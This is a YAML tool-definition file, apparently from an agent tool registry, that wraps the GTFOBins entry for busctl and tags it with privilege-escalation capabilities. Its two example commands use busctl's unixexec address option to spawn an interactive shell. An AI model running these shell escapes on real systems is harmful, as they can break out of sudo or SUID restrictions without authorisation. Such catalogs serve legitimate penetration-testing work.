---
id: system-dbus-busctl
namespace: system:dbus:busctl
name: busctl
description: Introspect and monitor the D-Bus bus, can spawn shells via address parameter or inherit less capabilities.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
  - system.file.read
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
    - shell-access
    - file-content
  consumes:
    - execution-context
    - file
contract:
  inputs:
    - type: security.execution.context
      description: Sudo, SUID, or unprivileged execution context
  outputs:
    - type: process.output
      description: Shell or file content output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 8
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: none
  disk_io: low
allowed-tools:
  - busctl
  - less
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "busctl"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via busctl address option
    command: |
      busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
  - description: Spawn a shell via busctl set-property
    command: |
      busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/busctl/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "systemd"
    commands:
      - "apt-get install -y systemd"
---
